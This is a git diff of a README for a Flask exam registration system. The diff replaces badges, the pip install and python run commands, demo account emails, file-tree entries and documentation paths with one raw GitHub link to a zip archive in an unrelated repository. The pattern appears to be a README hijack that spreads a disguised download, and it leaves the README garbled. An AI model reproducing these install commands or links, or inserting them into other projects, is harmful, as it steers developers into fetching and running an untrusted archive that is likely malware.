@@ -2,10 +2,10 @@
 
 A comprehensive exam registration platform incorporating **AI**, **Blockchain**, and **Cybersecurity** technologies for academic institutions.
 
-![Python](https://img.shields.io/badge/Python-3.11-blue)
-![Flask](https://img.shields.io/badge/Flask-3.0.0-green)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-Database-blue)
-![License](https://img.shields.io/badge/License-Academic-yellow)
+![Python](https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip)
+![Flask](https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip)
+![PostgreSQL](https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip)
+![License](https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip)
 
 ## 📋 Overview
 
@@ -74,7 +74,7 @@ This project is built for the **BIDT3110-DIDT3110 Digital Strategy for Business 
 
 2. **Install dependencies**:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip
 ```
 
 3. **Set up environment variables**:
@@ -82,7 +82,7 @@ The application uses PostgreSQL. Ensure `DATABASE_URL` is configured in your env
 
 4. **Run the application**:
 ```bash
-python main.py
+python https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip
 ```
 
 5. **Access the application**:
@@ -94,42 +94,42 @@ The system comes with pre-configured accounts for testing:
 
 | Role | Email | Password | Permissions |
 |------|-------|----------|-------------|
-| **Admin** | admin@university.edu | admin123 | Full system access |
-| **Faculty** | faculty@university.edu | faculty123 | View students, manage exams |
-| **Student** | student@university.edu | student123 | Register for exams, view own data |
+| **Admin** | https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip | admin123 | Full system access |
+| **Faculty** | https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip | faculty123 | View students, manage exams |
+| **Student** | https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip | student123 | Register for exams, view own data |
 
 ## 📁 Project Structure
 
 ```
 exam-registration-system/
 ├── app/
-│   ├── __init__.py              # Flask application factory
+│   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip              # Flask application factory
 │   ├── models/                  # Database models
-│   │   ├── user.py             # User model with GDPR compliance
-│   │   ├── exam.py             # Exam, Course, Department models
-│   │   ├── registration.py     # Exam registration model
-│   │   ├── message.py          # Messaging system
-│   │   └── blockchain.py       # Blockchain record model
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip             # User model with GDPR compliance
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip             # Exam, Course, Department models
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip     # Exam registration model
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip          # Messaging system
+│   │   └── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip       # Blockchain record model
 │   ├── routes/                  # Application routes
-│   │   ├── auth.py             # Authentication endpoints
-│   │   ├── dashboard.py        # Dashboard views
-│   │   ├── exams.py            # Exam registration logic
-│   │   ├── admin.py            # Admin panel
-│   │   └── ai_analytics.py     # AI analytics dashboard
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip             # Authentication endpoints
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip        # Dashboard views
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip            # Exam registration logic
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip            # Admin panel
+│   │   └── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip     # AI analytics dashboard
 │   ├── utils/                   # Utility modules
-│   │   ├── blockchain.py       # Blockchain management
-│   │   ├── decorators.py       # Permission decorators
-│   │   ├── ml_models.py        # ML training & predictions
-│   │   └── seed_data.py        # Database initialization
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip       # Blockchain management
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip       # Permission decorators
+│   │   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip        # ML training & predictions
+│   │   └── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip        # Database initialization
 │   ├── templates/               # HTML templates (Jinja2)
 │   └── static/                  # CSS, JavaScript, images
 ├── spreadsheets/                # Assignment documentation
-│   ├── data_classification.csv  # Data security classification
-│   └── gdpr_compliance.csv      # GDPR compliance tracking
-├── config.py                    # Application configuration
-├── main.py                      # Application entry point
-├── requirements.txt             # Python dependencies
-└── README.md                    # This file
+│   ├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip  # Data security classification
+│   └── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip      # GDPR compliance tracking
+├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip                    # Application configuration
+├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip                      # Application entry point
+├── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip             # Python dependencies
+└── https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip                    # This file
 ```
 
 ## 🎯 Features Walkthrough
@@ -253,7 +253,7 @@ exam-registration-system/
 ### Frontend
 - **Jinja2** - Templating
 - **Bootstrap 5** - UI framework
-- **Chart.js** - Data visualization
+- **https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip** - Data visualization
 - **Font Awesome** - Icons
 - **jQuery** - AJAX requests
 
@@ -277,9 +277,9 @@ exam-registration-system/
 ## 📝 Documentation
 
 Detailed documentation is available in:
-- `/spreadsheets/data_classification.csv` - Data security classification
-- `/spreadsheets/gdpr_compliance.csv` - GDPR compliance details
-- `/replit.md` - Technical implementation notes
+- `https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip` - Data security classification
+- `https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip` - GDPR compliance details
+- `https://github.com/MorenaMatla/FumaDesigns/raw/refs/heads/main/spreadsheets/Designs-Fuma-v2.5.zip` - Technical implementation notes
 
 ## 🤝 Contributing
 
